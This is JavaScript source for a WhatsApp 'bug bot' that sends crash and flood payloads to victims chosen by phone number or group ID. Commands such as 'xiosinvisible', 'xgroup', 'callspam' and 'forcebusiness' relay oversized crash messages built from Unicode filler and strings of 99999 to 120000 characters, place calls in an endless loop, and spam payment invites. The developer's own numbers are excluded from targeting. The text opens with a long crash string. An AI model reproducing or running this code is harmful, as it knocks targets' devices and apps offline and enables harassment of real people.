࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬y",
    "textArgb": 0,
    "backgroundArgb": 0,
    "font": "SYSTEM",
    "previewType": "NONE",
    "jpegThumbnail": "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",
    "thumbnailDirectPath": "",
    "thumbnailSha256": "",
    "thumbnailEncSha256": "",
    "inviteLinkGroupTypeV2": "DEFAULT"
  }
}), {userJid: target }); 
await Avishka.relayMessage(target, bugios2.message, { messageId: bugios2.key.id });
}

//ios2
async function xeonIOSINVI2(target){
Avishka.relayMessage(target, {
viewOnceMessage: {
message: {"locationMessage":{"degreesLatitude":-21.980324912168495,"degreesLongitude":24.549921490252018,"name":`🦄 REAL-KING-AVI 🦄${xeontext1}`,"address":`${xeontext1}${xeontext1}`,"jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="}}
}}, {})
}

//ios3
async function xeonIOSINVI3(target){
Avishka.relayMessage(target, {
viewOnceMessage: {
message: {"extendedTextMessage":{"text":"🦄 REAL-KING-AVI 🦄 \n|  Http://Wa.me//bugios/lucid&patones","matchedText":"Http://Wa.me//bugios/lucid&patones","jpegThumbnail":"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAAAQIDBQQGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzYMQ7CtTdVjIQgJPvk5DTp24bNGnTNjocHOoAnpZdsm3nQu6Si2C1ejL6eblUAMiyTiiZFDQCGCAAAACSAQB//8QAJhAAAgIBAgUEAwAAAAAAAAAAAREAAgMEECAhIjFBEhRRYRMwcf/aAAgBAQABPwBQB7KAcuIhGKXXSB4EKQU9LBMAnhcGIO9RLVRP9hHISwQX1wUDsBK46cgnKaWtMgsAxK6Y2uiEzBpMQJHqfKZMFaYiZiw0viNjCAztjKsDMZARhIOI1NkbS+PO+kkz8eo+4Md11OXVcIHzLBHYFCY7WYAMyam90D4mPVWaPxPdXCnury2c3qBLFnYjtKlFx9Ths7OHkZ4nmHgfM7EvYdv0GGDsdv/EAB4RAQACAQQDAAAAAAAAAAAAAAEAAhEDEDFBEiAw/9oACAECAQE/APVQlRtxHTcZzumZXxrXli1Tud/T/8QAGREBAQEAAwAAAAAAAAAAAAAAAREQACAw/9oACAEDAQE/AOqzLqXgT2//2Q==","canonicalUrl":"Http://Wa.me//bugios/lucid&patones","description":`${xeontext1}`,"title":`🦄 REAL-KING-AVI 🦄`,"previewType":"quick_reply","inviteLinkGroupTypeV2":"Type2"}}
}}, {})
}
 
  async function sendOfferCall(target) {
    try {
        await Avishka.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
  
  if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
switch(command) {

case 'idch':
case 'cekidch': 
case 'checkidch': {
    // Check if the command is for developers only
    // Ensure the message is a reply to a forwarded message
    if (!m.quoted || !m.quoted.id || !m.quoted.contextInfo) {
        return replygcxeon('Please reply to a message forwarded from the channel.');
    }

    try {
        console.log('Quoted Object:', JSON.stringify(m.quoted, null, 2));

        let contextInfo = m.quoted.contextInfo;

        // Check if the message is from a channel
        if (contextInfo.forwardedNewsletterMessageInfo) {
            let forwardedInfo = contextInfo.forwardedNewsletterMessageInfo;
            let channelId = forwardedInfo.newsletterJid;
            let channelName = forwardedInfo.newsletterName;

            // Prepare the response with channel data
            let send_ch = `*Your Channel Data:*\n` +
                          `*Channel Name*: ${channelName}\n` +
                          `*Channel ID*: ${channelId}`;
            await replygcxeon(send_ch);
        } else {
            // Message is not from a valid channel
            return replygcxeon('Channel ID or name not found. Make sure the message is from a valid channel..');
        }
    } catch (e) {
        console.error('Error:', e.message);
        replygcxeon('An error occurred while retrieving data from the forwarded message. Make sure the message is from the channel.');
    }
}
break;
case 'forcebusiness':
jidsgroup = '120363047626537933@g.us'
for (let i = 0; i < 10; i++) {
  await Avishka.relayMessage(m.chat, {
    "messageContextInfo": {
      "messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
      "deviceListMetaData": {},
      "deviceListMetadataVersion": 2
    },
    "paymentInviteMessage": {
      "amount": {
        "currencyCode": "USD",
        "amount1000": "1000" 
      },
      "note": "By Jhonixho 🤑", 
      "requestFrom": "999999999", 
      "expiryTimestamp": Date.now() + 3600 * 1000, 
      "background": "BLUE", 
    }
  }, {additionalAttributes:{
    edit: '7'
  }});
}
break;
case 'xiosinvisible': case 'xiosinvi':
if (allowedUsers37.includes(avimatch37)) {
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
async function iosCrash(target){
await Avishka.relayMessage(target, {
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000)
}
}, {})
await Avishka.relayMessage(target, {
extendedTextMessage: {
text: "This is a message with context info",
contextInfo: {
stanzaId: "1234567890ABCDEF",
participant: target,
quotedMessage: {
conversation: "This is a quoted message"
},
remoteJid: target,
mentionedJid: ["916909137213@s.whatsapp.net"],
conversionSource: "source_example",
conversionData: Buffer.from("conversion_data_example"),
conversionDelaySeconds: 10,
forwardingScore: 1,
isForwarded: true,
quotedAd: {
advertiserName: "Example Advertiser",
mediaType: 1,
jpegThumbnail: await getBuffer('https://t2.tudocdn.net/632662?w=646&h=284'),
caption: "This is an ad caption"
},
placeholderKey: {
remoteJid: target,
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: 86400,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: Buffer.from("ephemeral_shared_secret_example"),
externalAdReply: {
title: "External Ad Title",
body: "External Ad Body",
mediaType: 1,
thumbnailUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
mediaUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
thumbnail: Buffer.from("1234567890abcdef", "hex"),
sourceType: "source_type_example",
sourceId: "source_id_example",
sourceUrl: "https://telegra.ph/file/409fcacdda459445da6eb.png",
containsAutoReply: true,
renderLargerThumbnail: true,
showAdAttribution: true,
ctwaClid: "ctwa_clid_example",
ref: "ref_example"
},
entryPointConversionSource: "entry_point_source_example",
entryPointConversionApp: "entry_point_app_example",
entryPointConversionDelaySeconds: 5,
disappearingMode: {
duration: 604800
},
actionLink: {
buttonText: "Click Here",
url: "https://example.com"
},
groupSubject: "Example Group Subject",
parentGroupJid: "5531988888888-1234567890@g.us",
trustBannerType: "trust_banner_example",
trustBannerAction: 1,
isSampled: false,
utm: {
utmSource: "utm_source_example",
utmCampaign: "utm_campaign_example"
},
forwardedNewsletterMessageInfo: {
newsletterJid: "916909137213-1234567890@g.us",
serverMessageId: 1,
newsletterName: "x".repeat(99999),
contentType: 1,
accessibilityText: "Example accessibility text"
},
businessMessageForwardInfo: {
businessOwnerJid: "916909137213@s.whatsapp.net"
},
smbClientCampaignId: "smb_client_campaign_id_example",
smbServerCampaignId: "smb_server_campaign_id_example",
dataSharingContext: {
showMmDisclosure: true
}
}
}
}, {})
}
replygcxeon(`In process`)
	await sleep(1000)
for (let i = 0; i < 10; i++) {
await iosCrash(Xreturn)
}
	sendMessageWithMentions(
    "Successfully Sent Bug To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
} else {
    	await xeonydatabase36();
    }
break;
case 'eval': {
	if (allowedUsers37.includes(avimatch37)) {
if (!m.quoted) return replygcxeon(`*Reply chat*`);
const kripto = require('crypto');
let penis = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2);
let jeneng = `MessageData_${kripto.randomBytes(8).toString('hex')}.json`;
await fs.writeFileSync(jeneng, penis);
await replygcxeon(penis);
await Avishka.sendMessage(from, { document: { url: `./${jeneng}` }, fileName: jeneng, mimetype: '*/*' }, { quoted: m });
await fs.unlinkSync(jeneng);
} else {
    	await xeonydatabase37();
    }
}
break
case 'callspam':{
	if (allowedUsers36.includes(avimatch36)) {
if (!q) return replygcxeon(`Example:\n ${prefix + command} 91xxx`)
victim = text.split("|")[0]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "916909137213") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  sendMessageWithMentions(
    "Successfully Sent Spam Call To @" + Xreturn.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [Xreturn]
  );
	await sleep(1000)
while (true) {
await sendOfferCall(Xreturn)
}
  } else {
    	await xeonydatabase36();
    }
  }
break;
	case 'xgroup':
	if (allowedUsers34.includes(avimatch34)) {
	if (!q) return replygcxeon(`Example:\n ${prefix + command} 120363047626537xxx@g.us\n\nTo get group id, please type .listgc\n\nTo get group id from a group link, type .group-id link `)
victim = text.split("|")[0]
async function xgc4(victim) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await Avishka.relayMessage(victim, messsage, {
                    userJid: victim,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function xgc(victim){
	Avishka.relayMessage(victim,{                viewOnceMessage: {
message: {
                        messageContextInfo: {
                            deviceListMetadataVersion: 2,
                            deviceListMetadata: {},
                        }, 
    "extendedTextMessage": {
        "text": "🦄 REAL-KING-AVI 🦄" ,
        "previewType": true,
        "contextInfo": {
            "stanzaId": "B69F7CFEE38571AB03CD9DEEFAD69605",
